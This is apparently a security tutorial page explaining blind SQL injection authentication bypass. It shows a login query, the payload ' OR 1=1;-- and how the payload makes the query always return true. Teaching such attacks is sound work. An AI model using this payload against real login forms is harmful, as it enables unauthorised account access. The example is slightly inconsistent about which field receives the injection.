---
sidebar_position: 3
---

# Blind SQLi Authentication Bypass

In `Blind SQLi` is when we get little to no **Feedback** to confirm whether our Injected Queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. 

<br/>

**Login Forms** that are connected to a Database of Users are often developed in such a way that the web Application isn't interested in the content of the Username and Password but more whether the two make a matching pair in the Users Table. 

The web application is asking the Database **"Do you Have the USERNAME `user` - PASSWOD `password` "**, and the database replies with either `(True/False)` and, depending on that answer, dictates whether the Web Application lets you proceed or not. 

<br/>
<br/>

- **Website Processing Query:**  
	- The `username` and `password` values are taken from the Login form Fields.

```sql
select * from users where username='username' and password='password' LIMIT 1;
```

<br/>


- **Making the Query Return True:**  
	- Because `1=1` is a True Statement and we used an `OR` Operator, this will always cause the Query to return as True, which satisfies the web applications logic that the database found a valid **USERNAME/PASSWORD** combination and that access should be Allowed.
	
```sql
' OR 1=1;--
```

<br/>

- **Current Query:**  	

```sql
select * from users where username='' and password='' OR 1=1;
```

<br/>

- **Login Field:**  

```sql
+----------+
| USERNAME | - ► user' OR 1=1;--
+----------+
| PASSWORD | - ► ***********
+----------+
```